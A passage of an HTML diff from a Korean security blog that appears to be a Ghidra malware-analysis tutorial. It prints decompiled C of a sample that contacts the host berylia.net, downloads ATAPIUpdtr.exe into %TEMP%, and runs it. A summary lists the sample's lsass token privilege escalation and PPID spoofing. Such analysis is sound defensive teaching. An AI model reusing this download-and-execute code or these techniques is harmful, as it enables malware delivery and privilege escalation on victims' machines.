+      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (local_24 == (HINTERNET)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;) {
+        uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;0xe&lt;/span&gt;;
+      }
+      &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+        local_58 = &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
+        hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+        InternetQueryOptionW_addr =
+             (InternetQueryOptionW *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetQueryOptionW&amp;quot;&lt;/span&gt;);
+        WVar4 = (*InternetQueryOptionW_addr)(local_24,&lt;span class=&#34;hljs-number&#34;&gt;0x1f&lt;/span&gt;,&amp;amp;local_54,&amp;amp;local_58);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WVar4 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+          hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+          InternetSetOptionW_addr =
+               (InternetSetOptionW *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetSetOptionW&amp;quot;&lt;/span&gt;);
+          local_54 = local_54 | &lt;span class=&#34;hljs-number&#34;&gt;0x1180&lt;/span&gt;;
+          (*InternetSetOptionW_addr)(local_24,&lt;span class=&#34;hljs-number&#34;&gt;0x1f&lt;/span&gt;,&amp;amp;local_54,&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
+        }
+        hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+        HttpSendRequestA_addr = (HttpSendRequestA *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;HttpSendRequestA&amp;quot;&lt;/span&gt;);
+        local_34 = (*HttpSendRequestA_addr)(local_24,(LPCSTR)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,(LPVOID)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+        local_38 = &lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;16000&lt;/span&gt;);
+        &lt;span class=&#34;hljs-built_in&#34;&gt;memset&lt;/span&gt;(local_38,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;16000&lt;/span&gt;);
+        &lt;span class=&#34;hljs-built_in&#34;&gt;memset&lt;/span&gt;(DAT_00416024,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;);
+        temp_path = getenv(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;TEMP&amp;quot;&lt;/span&gt;);
+        temp_path_len = &lt;span class=&#34;hljs-built_in&#34;&gt;strlen&lt;/span&gt;(temp_path);
+        DAT_00416028 = (LPCSTR)&lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(temp_path_len + &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;);
+        &lt;span class=&#34;hljs-built_in&#34;&gt;strcpy&lt;/span&gt;(DAT_00416028,temp_path);
+        uVar6 = &lt;span class=&#34;hljs-number&#34;&gt;0xffffffff&lt;/span&gt;;
+        pcVar7 = DAT_00416028;
+        &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt; {
+          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (uVar6 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+          uVar6 = uVar6 - &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+          cVar1 = *pcVar7;
+          pcVar7 = pcVar7 + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+        } &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; (cVar1 != &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\0&amp;apos;&lt;/span&gt;);
+        puVar5 = (undefined4 *)(DAT_00416028 + (~uVar6 - &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;));
+        *puVar5 = &lt;span class=&#34;hljs-number&#34;&gt;0x4154415c&lt;/span&gt;;
+        puVar5[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x70554950&lt;/span&gt;;
+        puVar5[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x2e727464&lt;/span&gt;;
+        puVar5[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x657865&lt;/span&gt;;
+        MultiByteToWideChar(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,DAT_00416028,&lt;span class=&#34;hljs-number&#34;&gt;-1&lt;/span&gt;,DAT_00416024,&lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;);
+        hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+        CreateFileW_addr = (CreateFileW *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CreateFileW&amp;quot;&lt;/span&gt;);
+        local_44 = (*CreateFileW_addr)(DAT_00416024,&lt;span class=&#34;hljs-number&#34;&gt;0xc0000000&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,(LPSECURITY_ATTRIBUTES)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x80&lt;/span&gt;,
+                                       (HANDLE)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;);
+        local_5c = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+        hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+        InternetReadFile_addr = (InternetReadFile *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetReadFile&amp;quot;&lt;/span&gt;);
+        hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+        WriteFile_addr = (WriteFile *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;WriteFile&amp;quot;&lt;/span&gt;);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (local_34 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+          uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;0xe&lt;/span&gt;;
+        }
+        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+          local_60 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+          &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt;( &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt; ) {
+            WVar4 = (*InternetReadFile_addr)(local_24,local_38,&lt;span class=&#34;hljs-number&#34;&gt;0x2000&lt;/span&gt;,&amp;amp;local_60);
+            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ((WVar4 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) || (local_60 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)) {
+              bVar2 = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;
+            }
+            &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+              bVar2 = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;
+            }
+            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!bVar2) &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+            (*WriteFile_addr)(local_44,local_38,local_60,&amp;amp;local_5c,(LPOVERLAPPED)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;);
+          }
+          hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+          InternetCloseHandle_addr =
+               (InternetCloseHandle *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetCloseHandle&amp;quot;&lt;/span&gt;);
+          CloseHandle(local_44);
+          (*InternetCloseHandle_addr)(local_14);
+          (*InternetCloseHandle_addr)(local_1c);
+          (*InternetCloseHandle_addr)(local_24);
+          uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+        }
+      }
+    }
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uVar3;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC0C1;&amp;#xB2F9;&amp;#xD788; &amp;#xAE30;&amp;#xB124;&amp;#xC694;&amp;#x2026; &amp;#xB098;&amp;#xB220;&amp;#xC11C; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xC544;&amp;#xC57C; &amp;#xD560; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC911;&amp;#xC694;&amp;#xD55C; &amp;#xBD80;&amp;#xBD84;&amp;#xB9CC; &amp;#xBF51;&amp;#xC544;&amp;#xB0B4;&amp;#xC11C; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD569;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;InternetConnectW_addr = (InternetConnectW *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetConnectW&amp;quot;&lt;/span&gt;);
+local_1c = (*InternetConnectW_addr)
+           (local_14,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;berylia.net&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x1bb&lt;/span&gt;,(LPCWSTR)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,(LPCWSTR)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC744; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCFC; &amp;#xB54C; &amp;#xB098;&amp;#xC654;&amp;#xB358; &lt;code&gt;berylia.net&lt;/code&gt;&amp;#xC774; &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; &amp;#xB098;&amp;#xC624;&amp;#xB124;&amp;#xC694;. &lt;code&gt;InternetConnectW&lt;/code&gt;&amp;#xB85C; &amp;#xD574;&amp;#xB2F9; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC5F0;&amp;#xACB0;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;HttpOpenRequestW_addr = (HttpOpenRequestW *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;HttpOpenRequestW&amp;quot;&lt;/span&gt;);
+local_24 = (*HttpOpenRequestW_addr)
+           (local_1c,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;GET&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;/index/&amp;quot;&lt;/span&gt;,(LPCWSTR)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,(LPCWSTR)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,(LPCWSTR *)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,
+            &lt;span class=&#34;hljs-number&#34;&gt;0x800000&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; GET Request&amp;#xB97C; &amp;#xBCF4;&amp;#xB0B4;&amp;#xB124;&amp;#xC694;. &amp;#xC74C;. &amp;#xB300;&amp;#xCDA9; &amp;#xC608;&amp;#xC0C1;&amp;#xC744; &amp;#xD574;&amp;#xBCF4;&amp;#xBA74; request&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&amp;#xD55C;&amp;#xB2E4;&amp;#xB77C;&amp;#xB294; &amp;#xAC00;&amp;#xC815;&amp;#xC744; &amp;#xC138;&amp;#xC6B8; &amp;#xC218; &amp;#xC788;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBC11;&amp;#xC5D0;&amp;#xB97C; &amp;#xB354; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCFC;&amp;#xAE4C;&amp;#xC694;?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;temp_path = getenv(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;TEMP&amp;quot;&lt;/span&gt;);
+temp_path_len = &lt;span class=&#34;hljs-built_in&#34;&gt;strlen&lt;/span&gt;(temp_path);
+DAT_00416028 = (LPCSTR)&lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(temp_path_len + &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;);
+&lt;span class=&#34;hljs-built_in&#34;&gt;strcpy&lt;/span&gt;(DAT_00416028,temp_path);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xD658;&amp;#xACBD;&amp;#xBCC0;&amp;#xC218;&amp;#xC5D0; &amp;#xC124;&amp;#xC815;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xB294; TEMP &amp;#xD3F4;&amp;#xB354;&amp;#xC758; &amp;#xACBD;&amp;#xB85C;&amp;#xB97C; &amp;#xBC1B;&amp;#xC544;&amp;#xC624;&amp;#xB124;&amp;#xC694;. &amp;#xC704;&amp;#xC5D0; &amp;#xC815;&amp;#xBCF4;&amp;#xC5D0;&amp;#xC11C; &amp;#xB354; &amp;#xCD94;&amp;#xAC00;&amp;#xB97C; &amp;#xD574;&amp;#xBCF4;&amp;#xBA74; temp &amp;#xACBD;&amp;#xB85C;&amp;#xC5D0; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;MultiByteToWideChar(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,DAT_00416028,&lt;span class=&#34;hljs-number&#34;&gt;-1&lt;/span&gt;,DAT_00416024,&lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;);
+hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+CreateFileW_addr = (CreateFileW *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CreateFileW&amp;quot;&lt;/span&gt;);
+local_44 = (*CreateFileW_addr)(DAT_00416024,&lt;span class=&#34;hljs-number&#34;&gt;0xc0000000&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,(LPSECURITY_ATTRIBUTES)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x80&lt;/span&gt;,
+                               (HANDLE)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;);
+local_5c = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+InternetReadFile_addr = (InternetReadFile *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetReadFile&amp;quot;&lt;/span&gt;);
+hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+WriteFile_addr = (WriteFile *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;WriteFile&amp;quot;&lt;/span&gt;);
+&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (local_34 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+    uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;0xe&lt;/span&gt;;
+}
+&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+    local_60 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt;( &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt; ) {
+        WVar4 = (*InternetReadFile_addr)(local_24,local_38,&lt;span class=&#34;hljs-number&#34;&gt;0x2000&lt;/span&gt;,&amp;amp;local_60);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ((WVar4 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) || (local_60 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)) {
+            bVar2 = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;
+        }
+        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+            bVar2 = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;
+        }
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!bVar2) &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+        (*WriteFile_addr)(local_44,local_38,local_60,&amp;amp;local_5c,(LPOVERLAPPED)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;);
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC5B4;&amp;#xAE40;&amp;#xC5C6;&amp;#xC774; &amp;#xC608;&amp;#xC0C1;&amp;#xC740; &amp;#xC801;&amp;#xC911;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;InternetReadFile&lt;/code&gt;&amp;#xC744; &amp;#xD1B5;&amp;#xD574;&amp;#xC11C; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC77D;&amp;#xC5B4;&amp;#xC640; &lt;code&gt;%TEMP%&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;CreateFile&lt;/code&gt;&amp;#xC744; &amp;#xD558;&amp;#xB294;&amp;#xAD70;&amp;#xC694;. &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xB294; &amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xC774;&amp;#xB984;&amp;#xC740; &amp;#xBB34;&amp;#xC5C7;&amp;#xC77C;&amp;#xAE4C;&amp;#x2026;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/07/11/idioth/ghidra_part5/Untitled%207.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ATAPIUpdtr.exe&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xC774;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
+&lt;h1 id=&#34;&amp;#xC815;&amp;#xB9AC;&#34;&gt;&lt;a href=&#34;#&amp;#xC815;&amp;#xB9AC;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xC815;&amp;#xB9AC;&#34;&gt;&lt;/a&gt;&amp;#xC815;&amp;#xB9AC;&lt;/h1&gt;&lt;p&gt;&amp;#xC790; &amp;#xC774;&amp;#xC81C; &amp;#xC815;&amp;#xB9AC;&amp;#xB97C; &amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;. &amp;#xD07C;&amp;#xC9C1;&amp;#xD07C;&amp;#xC9C1;&amp;#xD55C; &amp;#xD589;&amp;#xC704;&amp;#xB97C; &amp;#xAC04;&amp;#xB2E8;&amp;#xD558;&amp;#xAC8C; &amp;#xC815;&amp;#xB9AC;&amp;#xD558;&amp;#xBA74; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC544;&amp;#xC694;.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;lsass.exe&lt;/code&gt;&amp;#xC758; PID&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC628;&amp;#xB2E4;.&lt;/li&gt;
+&lt;li&gt;Token&amp;#xC744; &amp;#xD65C;&amp;#xC6A9;&amp;#xD574; &amp;#xAD8C;&amp;#xD55C;&amp;#xC744; &amp;#xC0C1;&amp;#xC2B9;&amp;#xC2DC;&amp;#xD0A8;&amp;#xB2E4;.&lt;/li&gt;
+&lt;li&gt;PPID Spoofing&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD55C;&amp;#xB2E4;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;berylia.net&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;ATAPIUpdtr.exe&lt;/code&gt;&amp;#xB97C; &lt;code&gt;%TEMP%&lt;/code&gt;&amp;#xC5D0; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&amp;#xD55C;&amp;#xB2E4;.&lt;/li&gt;
+&lt;li&gt;&amp;#xC2E4;&amp;#xD589;!&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&amp;#xC5B4;&amp;#x2026; &amp;#xB108;&amp;#xBB34; &amp;#xAC04;&amp;#xB2E8;&amp;#xD558;&amp;#xB124;&amp;#xC694;. &amp;#xD558;&amp;#xD56B;! &amp;#xC74C;&amp;#x2026; &lt;del&gt;&amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xB05D;&amp;#xB0B4;&amp;#xC57C; &amp;#xD558;&amp;#xC9C0;?&lt;/del&gt; &amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xB294; &amp;#xC800;&amp;#xC758; &amp;#xC608;&amp;#xC0C1;&amp;#xC774; &amp;#xD2C0;&amp;#xB9AC;&amp;#xC9C0; &amp;#xC54A;&amp;#xC558;&amp;#xC74C;&amp;#xC744; &amp;#xBCF4;&amp;#xC5EC;&amp;#xC8FC;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC774;&amp;#xC5C8;&amp;#xB358; &amp;#xAC70; &amp;#xAC19;&amp;#xC544;&amp;#xC694;. ghidra&amp;#xC758; &amp;#xD65C;&amp;#xC6A9;&amp;#xBC95;&amp;#xC5D0; &amp;#xC9D1;&amp;#xC911;&amp;#xD558;&amp;#xAE30;&amp;#xBCF4;&amp;#xB2E4;&amp;#xB294; &amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC; &amp;#xBD84;&amp;#xC11D;&amp;#xC774; &amp;#xC6B0;&amp;#xC120;&amp;#xC774; &amp;#xB418;&amp;#xC5C8;&amp;#xB358; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. (&amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xAE30;&amp;#xB2A5;&amp;#xC774; &amp;#xB611;&amp;#xAC19;&amp;#xC544;&amp;#xC11C; &amp;#xC5B4;&amp;#xCA54; &amp;#xC218; &amp;#xC5C6;&amp;#xC5B4;&amp;#xC694;.) Malware analysis &amp;#xD30C;&amp;#xD2B8;&amp;#xB97C; 1&amp;#xB85C; &amp;#xB05D;&amp;#xB0C8;&amp;#xC73C;&amp;#xBA74; &amp;#xC88B;&amp;#xC558;&amp;#xC744; &amp;#xD150;&amp;#xB370;&amp;#x2026;&lt;/p&gt;
+&lt;p&gt;&amp;#xC544;&amp;#xBB34;&amp;#xD2BC;! &amp;#xADF8;&amp;#xB798;&amp;#xB3C4; &amp;#xC624;&amp;#xB7AB;&amp;#xB3D9;&amp;#xC548; &amp;#xAE00;&amp;#xC744; &amp;#xC791;&amp;#xC131;&amp;#xD588;&amp;#xB124;&amp;#xC694;. &amp;#xB3C4;&amp;#xC6C0;&amp;#xC774; &amp;#xB418;&amp;#xC168;&amp;#xC73C;&amp;#xBA74; &amp;#xC88B;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#xB9CC;&amp;#x2026; &amp;#xC800;&amp;#xB294; &amp;#xBBF8;&amp;#xAC1C;&amp;#xD55C; &amp;#xC2E4;&amp;#xB825;&amp;#xC744; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; &amp;#xC788;&amp;#xB294; &amp;#xC0AC;&amp;#xB78C;&amp;#xC774;&amp;#xB77C;&amp;#xC11C;&amp;#x2026; &amp;#x3160;&amp;#x3160;&amp;#x2026; ghidra &amp;#xD30C;&amp;#xD2B8;&amp;#xB294; &amp;#xB354; &amp;#xB2E4;&amp;#xB8F0; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xC5C6;&amp;#xB294; &amp;#xAC83; &amp;#xAC19;&amp;#xC544; &amp;#xC774;&amp;#xC81C; &amp;#xC885;&amp;#xB8CC;&amp;#xD558;&amp;#xB824;&amp;#xACE0; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xB2E4;&amp;#xB2E4;&amp;#xC74C;&amp;#xC8FC;&amp;#xC5D0; &amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC; &amp;#xBD84;&amp;#xC11D; VM &amp;#xC790;&amp;#xB3D9;&amp;#xD654;&amp;#xC758; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xD30C;&amp;#xD2B8;&amp;#xB3C4; &amp;#xC5C5;&amp;#xB85C;&amp;#xB4DC;&amp;#xB418;&amp;#xB2C8; &amp;#xAE30;&amp;#xB2E4;&amp;#xB824; &amp;#xC8FC;&amp;#xC138;&amp;#xC6A9;~ &amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xB9CC;!&lt;/p&gt;
+ - hack &amp; life">
   <meta name="author" content="j0dev, y2sman">
   <meta name="keywords" content>
   <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
@@ -479,7 +937,7 @@ WriteFile_addr = (WriteFile *)GetProcAddress(hModule,&lt;span class=&#34;hljs-st
 &lt;p&gt;&amp;#xC5B4;&amp;#x2026; &amp;#xB108;&amp;#xBB34; &amp;#xAC04;&amp;#xB2E8;&amp;#xD558;&amp;#xB124;&amp;#xC694;. &amp;#xD558;&amp;#xD56B;! &amp;#xC74C;&amp;#x2026; &lt;del&gt;&amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xB05D;&amp;#xB0B4;&amp;#xC57C; &amp;#xD558;&amp;#xC9C0;?&lt;/del&gt; &amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xB294; &amp;#xC800;&amp;#xC758; &amp;#xC608;&amp;#xC0C1;&amp;#xC774; &amp;#xD2C0;&amp;#xB9AC;&amp;#xC9C0; &amp;#xC54A;&amp;#xC558;&amp;#xC74C;&amp;#xC744; &amp;#xBCF4;&amp;#xC5EC;&amp;#xC8FC;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC774;&amp;#xC5C8;&amp;#xB358; &amp;#xAC70; &amp;#xAC19;&amp;#xC544;&amp;#xC694;. ghidra&amp;#xC758; &amp;#xD65C;&amp;#xC6A9;&amp;#xBC95;&amp;#xC5D0; &amp;#xC9D1;&amp;#xC911;&amp;#xD558;&amp;#xAE30;&amp;#xBCF4;&amp;#xB2E4;&amp;#xB294; &amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC; &amp;#xBD84;&amp;#xC11D;&amp;#xC774; 